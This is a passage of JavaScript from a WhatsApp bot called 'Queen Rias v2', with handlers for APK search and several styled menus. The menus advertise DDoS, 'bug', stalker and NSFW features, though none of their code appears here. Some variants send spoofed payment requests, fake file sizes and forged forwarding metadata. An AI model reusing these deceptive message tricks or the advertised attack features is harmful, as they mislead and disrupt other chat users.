  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${jeson[0].title}
🔗 Link : ${jeson[0].url}
⭐ Total : ${jeson[0].total}
`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'apksearch': {
ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
if (!text) return newReply(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var jason = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${jason[0].package}
🔗 Link : ${jason[0].url}
👤 Develoepr : ${jason[0].developer}
⭐ Rating : ${jason[0].rating}
`;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: capt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: json[0].thumbnail }}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    ToxxicTechInc.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
  case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
        ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
            newReply(`𝐐𝐮𝐞𝐞𝐧 𝐑𝐢𝐚𝐬 𝐯𝟐 𝐡𝐚𝐬 𝐚 𝐭𝐨𝐭𝐚𝐥 𝐨𝐟 ${Toxxicfeature()} 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬`)
        break
                    case 'menu':
            case 'mainmenu': {
            ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
            let ownernya = ownernumber + '@s.whatsapp.net'
            let timestampe = speed()
            let latensie = speed() - timestampe
                neww = performance.now()
                oldd = performance.now()
            let a = db.data.users[sender]
            let me = m.sender
            let xmenu_oh = ` *𝒉𝒆𝒍𝒍𝒐* @${pushname}
${Riastimewisher}
   𝐐𝐔𝐄𝐄𝐍 𝐑𝐈𝐀𝐒 𝐆𝐑𝐄𝐌𝐎𝐑𝐘 𝐕𝟐
<!> 𝐌𝐀𝐃𝐄 𝐁𝐘 𝐓𝐎𝐗𝐗𝐈𝐂 <!>
ᯤ  𝐔𝐬𝐞𝐫 : ${pushname}
ᯤ  𝐎𝐰𝐧𝐞𝐫 : ${ownernya}
ᯤ  𝐒𝐭𝐚𝐭𝐮𝐬 : *Active*
ᯤ  𝐌𝐨𝐝𝐞 : *${ToxxicTechInc.public ? 'Public' : 'Self'}*
ᯤ  𝐏𝐫𝐞𝐟𝐢𝐱 :  *[ ${xprefix} ]*
ᯤ  𝐋𝐢𝐦𝐢𝐭 :  *${a.limit}*
ᯤ  𝐂𝐚𝐬𝐞𝐬 :  *${Toxxicfeature()}* 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬
ᯤ  𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐖𝐬-𝐛𝐚𝐢𝐥𝐞𝐲*
ᯤ  𝐒𝐭𝐚𝐭𝐮𝐬 : *𝐑𝐮𝐧𝐧𝐢𝐧𝐠*
ᯤ  𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝑻𝒐𝒙𝒙𝒊𝒄 𝑩𝒐𝒚
❍──────────◙
│ ♧ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐒𝐩𝐞𝐞𝐝 ${latensie.toFixed(4)} _𝐒𝐞𝐜_ \n│ ${oldd - neww} _𝐦𝐬_
│ ♧ 𝐑𝐀𝐌: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
❍──────────◙
┏❐  ⌜ 𝐑𝐢𝐚𝐬𝐌𝐞𝐧𝐮 ⌟ ❐
┃♧ ${prefix}allmenu
┃♧ ${prefix}searchmenu
┃♧ ${prefix}ddosmenu
┃♧ ${prefix}downloadmenu
┃♧ ${prefix}gamemenu
┃♧ ${prefix}funmenu
┃♧ ${prefix}aimenu
┃♧ ${prefix}groupmenu
┃♧ ${prefix}ownermenu
┃♧ ${prefix}convertmenu
┃♧ ${prefix}listmenu
┃♧ ${prefix}religionmenu
┃♧ ${prefix}animemenu
┃♧ ${prefix}riasmenu
┃♧ ${prefix}nsfwmenu
┃♧ ${prefix}librarymenu
┃♧ ${prefix}randomphotomenu
┃♧ ${prefix}randomvideomenu
┃♧ ${prefix}stickermenu
┃♧ ${prefix}databasemenu
┃♧ ${prefix}pterodactylmenu
┃♧ ${prefix}sharemenu
┃♧ ${prefix}stalkermenu
┃♧ ${prefix}bugmenu
┃♧ ${prefix}othermenu
┗❐`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: m
                    })
      } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU ⚙️",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU 🔎",
"title":"<!> Click To Display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU 📲",
"title":"<!> Click To Display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"DDOS MENU 👾",
"title":"<!> Click To Display",
"description":"Displays The List Of Ddos Features",
"id":"${prefix}ddosmenu"},
{"header":"GAME MENU 🎮",
"title":"<!> Click To Display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU 🎯",
"title":"<!> Click To Display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU 🤖",
"title":"<!> Click To Display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU 🌊",
"title":"<!> Click To Display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU 👤",
"title":"<!> Click To Display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU 📂",
"title":"<!> Click To Display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU 🗺️",
"title":"<!> Click To Display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU 🕌",
"title":"<!> Click To Display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"PHOTOXY MENU 📷",
"title":"<!> Click To Display",
"description":"Displays The List Of Photooxy Features",
"id":"${prefix}photooxymenu"},
{"header":"NSFW MENU 🔞",
"title":"<!> Click To Display",
"description":"Displays The List Of NSFW Features",
"id":"${prefix}nsfwmenu"},
{"header":"ANIME MENU 💓",
"title":"<!> Click To Display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU 🍀",
"title":"<!> Click To Display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU 🕊️",
"title":"<!> Click To Display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU 🎩",
"title":"<!> Click To Display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"RIAS MENU 🍑",
"title":"<!> Click To Display",
"description":"Displays The List Of Rias Features",
"id":"${prefix}riasmenu"},
{"header":"DATABASE MENU 📁",
"title":"<!> Click To Display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"PTERODACTYL MENU 💻",
"title":"<!> Click To Display",
"description":"Displays The List Of Pterodactyl Features",
"id":"${prefix}pterodactylmenu"},
{"header":"SHARE MENU ☮️",
"title":"<!> Click To Display",
"description":"Displays The List Of Store Features",
"id":"${prefix}sharemenu"},
{"header":"STALKER MENU 🥷",
"title":"<!> Click To Display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"LIBRARY MENU 📖",
"title":"<!> Click To Display",
"description":"Displays The List Of Library Features",
"id":"${prefix}librarymenu"},
{"header":"BUG MENU ⚡",
"title":"<!> Click To Display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU 🎉",
"title":"<!> Click To Display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
   ToxxicTechInc.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
}
break
            case 'allmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${allmenu(prefix, hituet)}`
ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
